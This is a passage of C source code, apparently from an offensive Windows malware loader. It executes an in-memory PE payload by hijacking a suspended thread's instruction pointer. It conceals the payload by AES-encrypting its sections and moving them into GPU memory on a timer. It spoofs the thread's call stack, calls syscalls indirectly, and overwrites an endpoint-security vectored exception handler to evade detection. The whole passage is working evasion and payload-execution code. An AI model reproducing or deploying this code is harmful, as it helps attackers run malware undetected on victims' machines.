        PIMAGE_TLS_CALLBACK*     ppTlsCallBack   = (PIMAGE_TLS_CALLBACK*)(pImgTlsDir->AddressOfCallBacks);

        for (; *ppTlsCallBack; ppTlsCallBack++) 
        {
            (*ppTlsCallBack)((LPVOID)pRunPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
        }
	}
	
    g_PeFluctuationConfig.pAddressOfEntryPoint = (PVOID)((ULONG_PTR)pRunPeBaseAddress + pPePayloadConfig.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

    //
	SecureCleanupPayloadConfig(&pPePayloadConfig);

    DBG_PRINT_A("[*] Executing PE Payload At Address: 0x%p ", g_PeFluctuationConfig.pAddressOfEntryPoint);

#ifdef STACK_SPOOFING

    if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)g_PeFluctuationConfig.ThreadToSpoof.pvStartAddr, NULL, CREATE_SUSPENDED, &dwThreadId)))
    {
        DBG_PRINT_A("[-] Failed To Create Thread With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
    }

    DBG_PRINT_A("[i] Created Thread %ld To Execute PE Payload At Address: 0x%p", dwThreadId, g_PeFluctuationConfig.ThreadToSpoof.pvStartAddr);

    ThreadCtx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &ThreadCtx))
	{
		DBG_PRINT_A("[!] GetThreadContext Failed With Error: %lu", GetLastError());
		return FAILED_EXECUTION;
	}

    ThreadCtx.Rip                           = (DWORD64)g_PeFluctuationConfig.pAddressOfEntryPoint;
    g_PeFluctuationConfig.hThreadToSpoof    = hThread;

	DBG_PRINT_A("[i] Updated Child Thread's Start Address: 0x%p ", (PVOID)ThreadCtx.Rip);

    if (!SetThreadContext(hThread, &ThreadCtx))
    {
        DBG_PRINT_A("[!] SetThreadContext Failed With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
	}

    if (!ResumeThread(hThread)) 
    {
        DBG_PRINT_A("[!] ResumeThread Failed With Error: %lu", GetLastError());
		return FAILED_EXECUTION;
    }

    /*
    WaitForSingleObject(hThread, INFINITE);

    if (!GetExitCodeThread(hThread, &dwThreadExitCode))
    {
        DBG_PRINT_A("[!] GetExitCodeThread Failed With Error: %lu", GetLastError());
        return FAILED_EXECUTION;
    }
    */

    return dwThreadExitCode;
#else
    
    ((DWORD(*)())g_PeFluctuationConfig.pAddressOfEntryPoint)();
    return 0;

#endif // STACK_SPOOFING

}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static __forceinline BOOL SetPeSectionsMemProtection(IN BOOL bSetDefault) 
{
    for (int i = 0; i < g_PeFluctuationConfig.cbNumberOfGpuSection; i++)
    {
        DWORD   dwOldProtect        = 0x00;
		DWORD   dwNewProtect        = bSetDefault ? g_PeFluctuationConfig.pGpuSections[i].dwSectionMemProtection : PAGE_READWRITE;
		PVOID   pSectionAddr        = (PVOID)g_PeFluctuationConfig.pGpuSections[i].uSectionAddress;
		SIZE_T  cbRegionSize        = g_PeFluctuationConfig.pGpuSections[i].cbSectionSize;

        if (bSetDefault)
        {

#ifdef GPU_SECTIONS_FLUCTUATION

			// Fetch Encrypted Section From VRAM
            if (!DownloadFromVram(g_PeFluctuationConfig.pD3D11Device, g_PeFluctuationConfig.pD3D11DeviceContext, &g_PeFluctuationConfig.pGpuSections[i].pVramBlob, pSectionAddr))
            {
				DBG_PRINT_A("[!] DownloadFromVram Failed With Error: %lu", GetLastError());
                return FALSE;
			}

#endif 

            // Decrypt Section
            Aes128CTRCrypt(
                (unsigned char*)pSectionAddr,
                (__int64)cbRegionSize,
                (unsigned char*)g_PeFluctuationConfig.bAesKey,
                (unsigned char*)g_PeFluctuationConfig.bAesIv
            );

			// Set Original Protection
            INVOKE_SYSCALL(FNV1A_NtProtectVirtualMemory, g_PeFluctuationConfig.STATUS, NtGetCurrentProcess(), &pSectionAddr, &cbRegionSize, dwNewProtect, &dwOldProtect);
            if (!NT_SUCCESS(g_PeFluctuationConfig.STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", g_PeFluctuationConfig.STATUS);
                return FALSE;
            }

        }
        else
        {
			// Change To RW
            INVOKE_SYSCALL(FNV1A_NtProtectVirtualMemory, g_PeFluctuationConfig.STATUS, NtGetCurrentProcess(), &pSectionAddr, &cbRegionSize, dwNewProtect, &dwOldProtect);
            if (!NT_SUCCESS(g_PeFluctuationConfig.STATUS))
            {
                DBG_PRINT_A("[!] NtProtectVirtualMemory Failed With Status: 0x%08X", g_PeFluctuationConfig.STATUS);
                return FALSE;
            }

            // Encrypt Section
            Aes128CTRCrypt(
                (unsigned char*)pSectionAddr,
                (__int64)cbRegionSize,
                (unsigned char*)g_PeFluctuationConfig.bAesKey,
                (unsigned char*)g_PeFluctuationConfig.bAesIv
            );

#ifdef GPU_SECTIONS_FLUCTUATION

			// Upload Encrypted Section To VRAM
            if (!UploadToVram(g_PeFluctuationConfig.pD3D11DeviceContext, &g_PeFluctuationConfig.pGpuSections[i].pVramBlob, pSectionAddr))
            {
                DBG_PRINT_A("[!] UploadToVram Failed With Error: %lu", GetLastError());
                return FALSE;
            }

			// Zero Out Section In RAM
            RtlSecureZeroMemory(pSectionAddr, cbRegionSize);
#endif 

        }
    }

	return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static __forceinline NT_TIB* FetchTib()
{
    return (NT_TIB*)__readgsqword(0x30);
}

static __forceinline SIZE_T AlignDown(SIZE_T val, SIZE_T align) {
    return (val & ~(align - 1));
}

static __forceinline BOOL IsWithinStackBounds(PBYTE p, PBYTE pLimit, PBYTE pBase) {
    return (p >= pLimit) && (p < pBase);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static __forceinline BOOL SetStackProtection(IN BOOL bRestore)
{
    EnterCriticalSection(&g_PeFluctuationConfig.csStackLock);

    PBYTE   pbStackBase         = (PBYTE)g_PeFluctuationConfig.pvStackBase;   
    PBYTE   pbStackLimit        = (PBYTE)g_PeFluctuationConfig.pvStackLimit;  
    SIZE_T  cbChain             = g_PeFluctuationConfig.ThreadToSpoof.cbTotalRequiredStackSize;
    CONTEXT ctxSpoofedThread    = { 0 };

    if (!g_PeFluctuationConfig.pvBackupStack || !pbStackBase || !pbStackLimit || pbStackBase <= pbStackLimit || !cbChain) 
    {
		// DBG_PRINT_A("[!] Invalid Stack Parameters, SetStackProtection Aborted");
        LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
        return FALSE;
    }

	// Restore Original Stack From Backup
	// Make Sure Stack Is Spoofed
    if (bRestore && g_PeFluctuationConfig.bIsStackSpoofed && g_PeFluctuationConfig.pvSpoofDstStart && g_PeFluctuationConfig.pvRsp)
    {
		// DBG_PRINT_A("[*] Restoring Original Stack From Backup ... ");

        if (!IsWithinStackBounds(g_PeFluctuationConfig.pvSpoofDstStart, pbStackLimit, pbStackBase) ||
            !IsWithinStackBounds((PBYTE)((ULONG_PTR)g_PeFluctuationConfig.pvSpoofDstStart + cbChain - 1), pbStackLimit, pbStackBase))
        {
			DBG_PRINT_A("[!] Spoofed Stack Is Out Of Bounds, Cannot Restore Original Stack");
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
			return FALSE;
        }

        if (SuspendThread(g_PeFluctuationConfig.hThreadToSpoof) == (DWORD)-1)
        {
            DBG_PRINT_A("[!] SuspendThread Failed With Error: %lu", GetLastError());
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

        ctxSpoofedThread.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(g_PeFluctuationConfig.hThreadToSpoof, &ctxSpoofedThread))
        {
            DBG_PRINT_A("[!] GetThreadContext Failed With Error: %lu", GetLastError());
            ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

		// Restore Original Stack
        RtlCopyMemory(g_PeFluctuationConfig.pvSpoofDstStart, g_PeFluctuationConfig.pvBackupStack, cbChain);
		
		// Restore Other Registers
        memcpy(&ctxSpoofedThread.Rax, &g_PeFluctuationConfig.pRegistersBackup.Rax, offsetof(CONTEXT, VectorRegister) - offsetof(CONTEXT, Rax));
        ctxSpoofedThread.EFlags = g_PeFluctuationConfig.pRegistersBackup.EFlags;

        // Restore Original RSP
        ctxSpoofedThread.Rsp = (DWORD64)g_PeFluctuationConfig.pvRsp;

        if (!SetThreadContext(g_PeFluctuationConfig.hThreadToSpoof, &ctxSpoofedThread))
        {
            DBG_PRINT_A("[!] SetThreadContext Failed With Error: %lu", GetLastError());
            ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

        ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);

        g_PeFluctuationConfig.bIsStackSpoofed   = FALSE;
        g_PeFluctuationConfig.pvSpoofDstStart   = NULL;
        g_PeFluctuationConfig.pvRsp             = NULL;

		LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);

		// DBG_PRINT_A("[*] Restored Original Stack Successfully");

        return TRUE;
    }

	// Backup Original Stack And Spoof With Fake Stack
	// Make Sure Stack Is Not Already Spoofed
    else if (!bRestore && !g_PeFluctuationConfig.bIsStackSpoofed)
    {
        PBYTE   pbDstTop            = NULL,
                pbDstStart          = NULL;    

		// DBG_PRINT_A("[*] Spoofing Stack With Fake Stack ... ");

        if (SuspendThread(g_PeFluctuationConfig.hThreadToSpoof) == (DWORD)-1) 
        {
			DBG_PRINT_A("[!] SuspendThread Failed With Error: %lu", GetLastError());
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

        ctxSpoofedThread.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(g_PeFluctuationConfig.hThreadToSpoof, &ctxSpoofedThread))
        {
			DBG_PRINT_A("[!] GetThreadContext Failed With Error: %lu", GetLastError());
            ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

		// Backup Original Registers
        memcpy(&g_PeFluctuationConfig.pRegistersBackup.Rax, &ctxSpoofedThread.Rax, offsetof(CONTEXT, VectorRegister) - offsetof(CONTEXT, Rax));
        g_PeFluctuationConfig.pRegistersBackup.EFlags = ctxSpoofedThread.EFlags;


        g_PeFluctuationConfig.pvRsp = (PVOID)ctxSpoofedThread.Rsp;
        pbDstTop                    = (PBYTE)AlignDown((SIZE_T)(pbStackBase - 32), 16);
        pbDstStart                  = pbDstTop - cbChain;

        if (!(pbDstStart >= (pbStackLimit + g_kMinSlack) && (pbDstStart + cbChain - 1) < pbStackBase))
        {
            PBYTE pvFallBack = (PBYTE)AlignDown((SIZE_T)(ctxSpoofedThread.Rsp - cbChain - 64), 16);

            if (pvFallBack >= (pbStackLimit + g_kMinSlack) && (pvFallBack + cbChain - 1) < pbStackBase)
            {
                pbDstStart = pvFallBack;
            }
            else
            { 
				DBG_PRINT_A("[!] Not Enough Stack Space To Spoof Call Stack");
                ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);
                LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock); 
                return FALSE; 
            }
        }

        RtlCopyMemory(g_PeFluctuationConfig.pvBackupStack, pbDstStart, cbChain);
        RtlCopyMemory(pbDstStart, g_PeFluctuationConfig.ThreadToSpoof.pvFakeStackBuffer, cbChain);

        ctxSpoofedThread.Rsp = (DWORD64)pbDstStart;

        if (!SetThreadContext(g_PeFluctuationConfig.hThreadToSpoof, &ctxSpoofedThread))
        {
			DBG_PRINT_A("[!] SetThreadContext Failed With Error: %lu", GetLastError());
            RtlCopyMemory(pbDstStart, g_PeFluctuationConfig.pvBackupStack, cbChain);
            ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);
            LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);
            return FALSE;
        }

        ResumeThread(g_PeFluctuationConfig.hThreadToSpoof);

        g_PeFluctuationConfig.pvSpoofDstStart = pbDstStart;
        g_PeFluctuationConfig.bIsStackSpoofed = TRUE;

        LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);

		// DBG_PRINT_A("[*] Spoofed Stack With Fake Stack");
        return TRUE;
    }

    LeaveCriticalSection(&g_PeFluctuationConfig.csStackLock);

	return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static VOID CALLBACK ObfuscationTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired)
{
	// Hide PE Sections In VRAM
    SetPeSectionsMemProtection(FALSE);

#ifdef STACK_SPOOFING
    // Spoof Call Stack
    SetStackProtection(FALSE);
#endif

	// Restore S1 VEH
    RestoreFirstVectoredExceptionHandler();
}

static VOID CALLBACK DeobfuscationTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired) 
{
    // Restore Call Stack
    SetStackProtection(TRUE);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

extern LONG NTAPI SupressPageGuardException(IN EXCEPTION_POINTERS* Info);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


static LONG WINAPI PeFluctuationVectoredHandler(IN PEXCEPTION_POINTERS pExceptionInfo)
{
	// Ignore Single Step Exceptions (This Is Handled By The TrapSyscalls Handler)
    if (pExceptionInfo->ExceptionRecord->ExceptionCode ==  STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION || pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION)
    {
		// Check If Exception Address Is Within Stack Or PE Sections
		// Most Probably The Exception Is Caused By The Stack First
        if (((ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress >= (ULONG_PTR)g_PeFluctuationConfig.pvStackBase || (ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress < (ULONG_PTR)g_PeFluctuationConfig.pvStackLimit) ||
            ((ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress >= (ULONG_PTR)g_PeFluctuationConfig.uPeRuntimeAddress && (ULONG_PTR)pExceptionInfo->ExceptionRecord->ExceptionAddress < (ULONG_PTR)(g_PeFluctuationConfig.uPeRuntimeAddress + g_PeFluctuationConfig.cbImageSize)))
        {

#ifdef STACK_SPOOFING
            if (!CreateTimerQueueTimer(&g_PeFluctuationConfig.hNewTimer, g_PeFluctuationConfig.hTimerQueue, (WAITORTIMERCALLBACK)DeobfuscationTimerCallback, NULL, 1, 0x00, 0x00))
            {
				DBG_PRINT_A("[!] CreateTimerQueueTimer Failed With Error: %lu", GetLastError());
				return EXCEPTION_CONTINUE_SEARCH;
            }

			Sleep(15);
#endif 
            
            // Remove S1 VEH
            OverwriteFirstVectoredExceptionHandlerEx(GetNtdllBaseAddress(), SupressPageGuardException);

            // Restore PE Sections In RAM
            SetPeSectionsMemProtection(TRUE);

			// Set Timer To Re-Hide The Section After PE_PAYLOAD_EXEC_WAIT_SECONDS seconds
            if (!CreateTimerQueueTimer(&g_PeFluctuationConfig.hNewTimer, g_PeFluctuationConfig.hTimerQueue, (WAITORTIMERCALLBACK)ObfuscationTimerCallback, NULL, PE_PAYLOAD_EXEC_WAIT_SECONDS * 1000, 0x00, 0x00)) 
            {
                DBG_PRINT_A("[!] CreateTimerQueueTimer Failed With Error: %lu", GetLastError());
				return EXCEPTION_CONTINUE_SEARCH;
            }

#ifdef STACK_SPOOFING
            g_PeFluctuationConfig.pvRsp             = (PVOID)(pExceptionInfo->ContextRecord->Rsp - 0x00);
            g_PeFluctuationConfig.pvStackBase       = FetchTib()->StackBase;
            g_PeFluctuationConfig.pvStackLimit      = FetchTib()->StackLimit;
#endif 


            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }


    return EXCEPTION_CONTINUE_SEARCH;
}


